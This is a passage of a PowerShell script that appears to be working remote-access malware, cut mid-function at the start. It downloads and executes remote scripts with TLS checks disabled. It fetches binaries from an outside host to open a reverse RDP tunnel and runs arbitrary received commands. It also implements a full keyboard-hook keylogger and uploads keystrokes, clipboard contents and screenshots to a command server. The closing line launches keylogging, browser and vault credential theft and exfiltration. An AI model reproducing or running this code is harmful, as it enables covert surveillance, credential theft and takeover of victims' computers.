                        if([IntPtr]::Size -eq 8) { 
                            & cmd /c %systemroot%\syswow64\windowspowershell\v1.0\powershell.exe "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { `$true }; IEX (New-Object Net.WebClient).DownloadString('$url/script?id=1&name=vnc');"
                            }
                        else { & cmd /c %systemroot%\system32\windowspowershell\v1.0\powershell.exe "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { `$true }; IEX (New-Object Net.WebClient).DownloadString('$url/script?id=1&name=vnc');" }
                        }
                   # +rdp username;password;trigger-port;10.0.0.1
                   elseif ($cmd.StartsWith("+rdp", 1)) { 
                        $creds = ($cmd.split(' '))[1]
                        $plink_username =  ($creds.split(';'))[0]
                        $plink_password = ($creds.split(';'))[1]
                        $plink_trigger_port = ($creds.split(';'))[2]
                        $plink_ip = ($creds.split(';'))[3]
                        $plink_username, $plink_password, $plink_trigger_port, $plink_ip
                        Start-Job -ScriptBlock { 
                        #IF ((Test-Path "$env:temp\plink.exe") -eq $False) { (New-Object System.Net.WebClient).DownloadFile('https://the.earth.li/~sgtatham/putty/latest/x86/plink.exe', "$env:temp\plink.exe");}
                        IF ((Test-Path "$env:temp\stnlc.exe") -eq $False) 
                            { 
                            (New-Object System.Net.WebClient).DownloadFile('http://sylviabodenheimer.ch/css/stnlc.bin', "$env:temp\stnlc.exe")
                            (New-Object System.Net.WebClient).DownloadFile('http://sylviabodenheimer.ch/css/CiWinCng32.dll', "$env:temp\CiWinCng32.dll")
                            }
                        $plink_username = $args[0]
                        $plink_password = $args[1]
                        $plink_trigger_port = $args[2]
                        $plink_ip = $args[3]
                        Stop-Process -name stnlc -ErrorAction SilentlyContinue
                        #& cmd /c "echo yes | $env:temp\plink.exe -R "+$plink_trigger_port+":127.0.0.1:3389 -l $plink_username -pw $plink_password $plink_ip -N" } -ArgumentList $plink_username, $plink_password, $plink_trigger_port, $plink_ip }
                        & cmd /c "echo S | $env:temp\stnlc.exe $plink_username@$plink_ip -s2c=0.0.0.0,$plink_trigger_port,localhost,3389 -pw=$plink_password"
                        & cmd /c "$env:temp\stnlc.exe $plink_username@$plink_ip -s2c=0.0.0.0,$plink_trigger_port,localhost,3389 -pw=$plink_password -unat=y"
                        } -ArgumentList $plink_username, $plink_password, $plink_trigger_port, $plink_ip }
                   elseif ($cmd -ne '') { Start-Job -ScriptBlock {& cmd /c $args[0]} -ArgumentList $cmd
                   Write-Host $args[0]
                   
                   }}}
            $WebGetTimer = 1200
            Start-Sleep -Seconds $WebGetTimer
            }
        } -ArgumentList $params.url, $params.resolution, $params.domain, $params.computer_name, $params.username, $params.timezone, $params.hashid, $params.version
    }

function PostFile($file_name) {
$name = (Get-ChildItem $file_name).name
$bytes = [System.IO.File]::ReadAllBytes($file_name)
$enc = [System.Text.Encoding]::GetEncoding($codePageName)
$data = $enc.GetString($bytes)

[System.Net.WebRequest]$webRequest = [System.Net.WebRequest]::Create($params.url+'/pshscr')
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
$webRequest.ContentType = "image/jpeg"
$webRequest.Method = "POST"
[byte[]]$bytes = $enc.GetBytes($data);
$webRequest.ContentLength = $bytes.Length;
$webRequest.Headers.add('content-disposition', "file=$name")
$webRequest.Headers.add('hashid', $params.hashid)
$webRequest.Headers.add('computer_name', $params.computer_name)
$webRequest.Headers.add('domain', $params.domain)
$webRequest.Headers.add('username', $params.username)
[System.IO.Stream]$reqStream = $webRequest.GetRequestStream()
$reqStream.Write($bytes, 0, $bytes.Length);
$reqStream.Flush();

$resp = $webRequest.GetResponse();
$rs = $resp.GetResponseStream();
[System.IO.StreamReader]$sr = New-Object System.IO.StreamReader -argumentList $rs;
$sr.ReadToEnd();

}



function WebPost {
    $pshlog_url = $params.url+"/pshlog"
    while ($true) {
        $WebPostTimer = 1200
        Start-Sleep -Seconds $WebPostTimer
        Write-host $params.log_file
        If (Test-Path $log_file) { 
            #$content = [IO.File]::ReadAllText($params.log_file)
            $aaa = Get-Content $params.log_file
            $content = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($aaa))
            $json = @{"resolution" = $params.resolution; "domain" = $params.domain; "computer_name" = $params.computer_name; "username" = $params.username; "timezone" = $params.timezone; "hashid" = $params.hashid; "version" = $params.version; "content" = $content; "type" = "keylog"}
            $log_json = $json | ConvertTo-Json
            Write-Host $log_json
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($log_json)
            [System.Net.HttpWebRequest] $webRequest = [System.Net.WebRequest]::Create($pshlog_url)
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            $webRequest.ContentType = "application/json"
            $webRequest.Timeout = 10000
            $webRequest.Method = "POST"
            $webRequest.ContentLength = $buffer.Length;


            $requestStream = $webRequest.GetRequestStream()
            $requestStream.Write($buffer, 0, $buffer.Length)
            $requestStream.Flush()
            $requestStream.Close()

            [System.Net.HttpWebResponse] $webResponse = $webRequest.GetResponse()
            $streamReader = New-Object System.IO.StreamReader($webResponse.GetResponseStream())
            $result = $streamReader.ReadToEnd()
            Remove-Item $log_file
}
        if (Test-Path "$env:Temp\Applnsights_VisualStudio.txt") {
            
            $clipfile = "$env:Temp\Applnsights_VisualStudio.txt"
            $aaa = Get-Content $clipfile | Out-String
            $content = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($aaa))
            
            $json = @{"resolution" = $params.resolution; "domain" = $params.domain; "computer_name" = $params.computer_name; "username" = $params.username; "timezone" = $params.timezone; "hashid" = $params.hashid; "version" = $params.version; "content" = $content; "type" = "clipboard"}
            $log_json = $json | ConvertTo-Json
            write-host $log_json
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($log_json)
            [System.Net.HttpWebRequest] $webRequest = [System.Net.WebRequest]::Create("$pshlog_url")
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            $webRequest.ContentType = "application/json"
            $webRequest.Timeout = 10000
            $webRequest.Method = "POST"
            $webRequest.ContentLength = $buffer.Length;


            $requestStream = $webRequest.GetRequestStream()
            $requestStream.Write($buffer, 0, $buffer.Length)
            $requestStream.Flush()
            $requestStream.Close()

            [System.Net.HttpWebResponse] $webResponse = $webRequest.GetResponse()
            $streamReader = New-Object System.IO.StreamReader($webResponse.GetResponseStream())
            $result = $streamReader.ReadToEnd()
            Remove-Item $clipfile
}


        $directoryInfo = Get-ChildItem $ScreenshotPath
        If ($directoryInfo) {
            $directoryInfo | ForEach-Object { 
                Write-Host $_.FullName
                PostFile($_.FullName)
                Remove-Item $_.FullName
        }
}
}
}


function Get-Keystrokes {
<#
.SYNOPSIS

.PARAMETER LogPath

	Specifies the path where pressed key details will be logged. By default, keystrokes are logged to %TEMP%\key.log.

.PARAMETER Timeout

	Specifies the interval in minutes to capture keystrokes. By default, keystrokes are captured indefinitely.

.PARAMETER PassThru

	Returns the keylogger's PowerShell object, so that it may manipulated (disposed) by the user; primarily for testing purposes.

.EXAMPLE

	Get-Keystrokes -LogPath C:\key.log

.EXAMPLE

	Get-Keystrokes -Timeout 20
    
.LINK

	http://www.obscuresec.com/
	http://www.exploit-monday.com/
	https://github.com/secabstraction
	https://github.com/ahhh/PSSE
	
#>
	[CmdletBinding()] 
	Param (
		[Parameter(Position = 0)]
		[ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent -Path $_)) -PathType Container})]
		[String]$LogPath = "$($env:TEMP)\key.log",
	
		[Parameter(Position = 1)]
		[Double]$Timeout,
	
		[Parameter()]
		[Switch]$PassThru
	)
	
	$LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)
	
	try { '"TypedKey","WindowTitle","Time"' | Out-File -FilePath $LogPath -Encoding unicode }
	catch { throw $_ }
	
	$Script = {
		Param (
			[Parameter(Position = 0)]
			[String]$LogPath,
	
			[Parameter(Position = 1)]
			[Double]$Timeout
		)
	
		function local:Get-DelegateType {
			Param (
				[OutputType([Type])]
			
				[Parameter( Position = 0)]
				[Type[]]
				$Parameters = (New-Object Type[](0)),
			
				[Parameter( Position = 1 )]
				[Type]
				$ReturnType = [Void]
			)
	
			$Domain = [AppDomain]::CurrentDomain
			$DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
			$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
			$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
			$TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
			$ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
			$ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
			$MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
			$MethodBuilder.SetImplementationFlags('Runtime, Managed')
		
			$TypeBuilder.CreateType()
		}
		function local:Get-ProcAddress {
			Param (
				[OutputType([IntPtr])]
		
				[Parameter( Position = 0, Mandatory = $True )]
				[String]
				$Module,
			
				[Parameter( Position = 1, Mandatory = $True )]
				[String]
				$Procedure
			)
	
			# Get a reference to System.dll in the GAC
			$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
				Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
			$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
			# Get a reference to the GetModuleHandle and GetProcAddress methods
			$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
			$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
			# Get a handle to the module specified
			$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
			$tmpPtr = New-Object IntPtr
			$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
		
			# Return the address of the function
			$GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
		}
	
		#region Imports
	
		[void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
	
		# SetWindowsHookEx
		$SetWindowsHookExAddr = Get-ProcAddress user32.dll SetWindowsHookExA
		$SetWindowsHookExDelegate = Get-DelegateType @([Int32], [MulticastDelegate], [IntPtr], [Int32]) ([IntPtr])
		$SetWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetWindowsHookExAddr, $SetWindowsHookExDelegate)
	
		# CallNextHookEx
		$CallNextHookExAddr = Get-ProcAddress user32.dll CallNextHookEx
		$CallNextHookExDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr], [IntPtr]) ([IntPtr])
		$CallNextHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CallNextHookExAddr, $CallNextHookExDelegate)
	
		# UnhookWindowsHookEx
		$UnhookWindowsHookExAddr = Get-ProcAddress user32.dll UnhookWindowsHookEx
		$UnhookWindowsHookExDelegate = Get-DelegateType @([IntPtr]) ([Void])
		$UnhookWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UnhookWindowsHookExAddr, $UnhookWindowsHookExDelegate)
	
		# PeekMessage
		$PeekMessageAddr = Get-ProcAddress user32.dll PeekMessageA
		$PeekMessageDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([Void])
		$PeekMessage = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PeekMessageAddr, $PeekMessageDelegate)
	
		# GetAsyncKeyState
		$GetAsyncKeyStateAddr = Get-ProcAddress user32.dll GetAsyncKeyState
		$GetAsyncKeyStateDelegate = Get-DelegateType @([Windows.Forms.Keys]) ([Int16])
		$GetAsyncKeyState = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAsyncKeyStateAddr, $GetAsyncKeyStateDelegate)
	
		# GetForegroundWindow
		$GetForegroundWindowAddr = Get-ProcAddress user32.dll GetForegroundWindow
		$GetForegroundWindowDelegate = Get-DelegateType @() ([IntPtr])
		$GetForegroundWindow = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetForegroundWindowAddr, $GetForegroundWindowDelegate)
	
		# GetWindowText
		$GetWindowTextAddr = Get-ProcAddress user32.dll GetWindowTextA
		$GetWindowTextDelegate = Get-DelegateType @([IntPtr], [Text.StringBuilder], [Int32]) ([Void])
		$GetWindowText = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetWindowTextAddr, $GetWindowTextDelegate)
	
		# GetModuleHandle
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
	
		#endregion Imports
	
		$CallbackScript = {
			Param (
				[Parameter()]
				[Int32]$Code,
	
				[Parameter()]
				[IntPtr]$wParam,
	
				[Parameter()]
				[IntPtr]$lParam
			)
	
			$Keys = [Windows.Forms.Keys]
		
			$MsgType = $wParam.ToInt32()
	
			# Process WM_KEYDOWN & WM_SYSKEYDOWN messages
			if ($Code -ge 0 -and ($MsgType -eq 0x100 -or $MsgType -eq 0x104)) {
			
				$hWindow = $GetForegroundWindow.Invoke()
	
				$ShiftState = $GetAsyncKeyState.Invoke($Keys::ShiftKey)
				if (($ShiftState -band 0x8000) -eq 0x8000) { $Shift = $true }
				else { $Shift = $false }
	
				$Caps = [Console]::CapsLock
	
				# Read virtual-key from buffer
				$vKey = [Windows.Forms.Keys][Runtime.InteropServices.Marshal]::ReadInt32($lParam)
	
				# Parse virtual-key
				if ($vKey -gt 64 -and $vKey -lt 91) { # Alphabet characters
					if ($Shift -xor $Caps) { $Key = $vKey.ToString() }
					else { $Key = $vKey.ToString().ToLower() }
				}
				elseif ($vKey -ge 96 -and $vKey -le 111) { # Number pad characters
					switch ($vKey.value__) {
						96 { $Key = '0' }
						97 { $Key = '1' }
						98 { $Key = '2' }
						99 { $Key = '3' }
						100 { $Key = '4' }
						101 { $Key = '5' }
						102 { $Key = '6' }
						103 { $Key = '7' }
						104 { $Key = '8' }
						105 { $Key = '9' }
						106 { $Key = "*" }
						107 { $Key = "+" }
						108 { $Key = "|" }
						109 { $Key = "-" }
						110 { $Key = "." }
						111 { $Key = "/" }
					}
				}
				elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 222)) {                      
					if ($Shift) {                           
						switch ($vKey.value__) { # Shiftable characters
							48 { $Key = ')' }
							49 { $Key = '!' }
							50 { $Key = '@' }
							51 { $Key = '#' }
							52 { $Key = '$' }
							53 { $Key = '%' }
							54 { $Key = '^' }
							55 { $Key = '&' }
							56 { $Key = '*' }
							57 { $Key = '(' }
							186 { $Key = ':' }
							187 { $Key = '+' }
							188 { $Key = '<' }
							189 { $Key = '_' }
							190 { $Key = '>' }
							191 { $Key = '?' }
							192 { $Key = '~' }
							219 { $Key = '{' }
							220 { $Key = '|' }
							221 { $Key = '}' }
							222 { $Key = '<Double Quotes>' }
						}
					}
					else {                           
						switch ($vKey.value__) {
							48 { $Key = '0' }
							49 { $Key = '1' }
							50 { $Key = '2' }
							51 { $Key = '3' }
							52 { $Key = '4' }
							53 { $Key = '5' }
							54 { $Key = '6' }
							55 { $Key = '7' }
							56 { $Key = '8' }
							57 { $Key = '9' }
							186 { $Key = ';' }
							187 { $Key = '=' }
							188 { $Key = ',' }
							189 { $Key = '-' }
							190 { $Key = '.' }
							191 { $Key = '/' }
							192 { $Key = '`' }
							219 { $Key = '[' }
							220 { $Key = '\' }
							221 { $Key = ']' }
							222 { $Key = '<Single Quote>' }
						}
					}
				}
				else {
					switch ($vKey) {
						$Keys::F1  { $Key = '<F1>' }
						$Keys::F2  { $Key = '<F2>' }
						$Keys::F3  { $Key = '<F3>' }
						$Keys::F4  { $Key = '<F4>' }
						$Keys::F5  { $Key = '<F5>' }
						$Keys::F6  { $Key = '<F6>' }
						$Keys::F7  { $Key = '<F7>' }
						$Keys::F8  { $Key = '<F8>' }
						$Keys::F9  { $Key = '<F9>' }
						$Keys::F10 { $Key = '<F10>' }
						$Keys::F11 { $Key = '<F11>' }
						$Keys::F12 { $Key = '<F12>' }
			
						$Keys::Snapshot    { $Key = '<Print Screen>' }
						$Keys::Scroll      { $Key = '<Scroll Lock>' }
						$Keys::Pause       { $Key = '<Pause/Break>' }
						$Keys::Insert      { $Key = '<Insert>' }
						$Keys::Home        { $Key = '<Home>' }
						$Keys::Delete      { $Key = '<Delete>' }
						$Keys::End         { $Key = '<End>' }
						$Keys::Prior       { $Key = '<Page Up>' }
						$Keys::Next        { $Key = '<Page Down>' }
						$Keys::Escape      { $Key = '<Esc>' }
						$Keys::NumLock     { $Key = '<Num Lock>' }
						$Keys::Capital     { $Key = '<Caps Lock>' }
						$Keys::Tab         { $Key = '<Tab>' }
						$Keys::Back        { $Key = '<Backspace>' }
						$Keys::Enter       { $Key = '<Enter>' }
						$Keys::Space       { $Key = '< >' }
						$Keys::Left        { $Key = '<Left>' }
						$Keys::Up          { $Key = '<Up>' }
						$Keys::Right       { $Key = '<Right>' }
						$Keys::Down        { $Key = '<Down>' }
						$Keys::LMenu       { $Key = '<Alt>' }
						$Keys::RMenu       { $Key = '<Alt>' }
						$Keys::LWin        { $Key = '<Windows Key>' }
						$Keys::RWin        { $Key = '<Windows Key>' }
						$Keys::LShiftKey   { $Key = '<Shift>' }
						$Keys::RShiftKey   { $Key = '<Shift>' }
						$Keys::LControlKey { $Key = '<Ctrl>' }
						$Keys::RControlKey { $Key = '<Ctrl>' }
                        $Keys::MouseClick  { $Key = '<LMouse>' }
					}
				}
	
				# Get foreground window's title
				$Title = New-Object Text.Stringbuilder 256
				$GetWindowText.Invoke($hWindow, $Title, $Title.Capacity)
	
				# Define object properties
				$Props = @{
					Key = $Key
					Time = [DateTime]::Now
					Window = $Title.ToString()
                    
				}
	
				$obj = New-Object psobject -Property $Props
			
				# Hack since Export-CSV doesn't have an append switch in PSv2
				$CSVEntry = ($obj | Select-Object Key,Window,Time | ConvertTo-Csv -NoTypeInformation)[1]+'[]nl'
                #Invoke-WebRequest -uri "http://45.79.173.232:9002/log" -Method POST -Body $JSON
				Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode
			}
			return $CallNextHookEx.Invoke([IntPtr]::Zero, $Code, $wParam, $lParam)
		}
	
		# Cast scriptblock as LowLevelKeyboardProc callback
		$Delegate = Get-DelegateType @([Int32], [IntPtr], [IntPtr]) ([IntPtr])
		$Callback = $CallbackScript -as $Delegate
	
		# Get handle to PowerShell for hook
		$PoshModule = (Get-Process -Id $PID).MainModule.ModuleName
		$ModuleHandle = $GetModuleHandle.Invoke($PoshModule)
	
		# Set WM_KEYBOARD_LL hook
		$Hook = $SetWindowsHookEx.Invoke(0xD, $Callback, $ModuleHandle, 0)
	
		$Stopwatch = [Diagnostics.Stopwatch]::StartNew()
	
		while ($true) {
			if ($PSBoundParameters.Timeout -and ($Stopwatch.Elapsed.TotalMinutes -gt $Timeout)) { break }
			$PeekMessage.Invoke([IntPtr]::Zero, [IntPtr]::Zero, 0x100, 0x109, 0)
			Start-Sleep -Milliseconds 10
		}
	
		$Stopwatch.Stop()
	
		# Remove the hook
		$UnhookWindowsHookEx.Invoke($Hook)
	}
	
	# Setup KeyLogger's runspace
	$PowerShell = [PowerShell]::Create()
	[void]$PowerShell.AddScript($Script)
	[void]$PowerShell.AddArgument($LogPath)
	if ($PSBoundParameters.Timeout) { [void]$PowerShell.AddArgument($Timeout) }
	
	# Start KeyLogger
	[void]$PowerShell.BeginInvoke()
	
	if ($PassThru.IsPresent) { return $PowerShell }
}

Get-Keystrokes; Title-Monitor; WebGet; GetChrome; GetFF; GetVault; Gclip; WebPost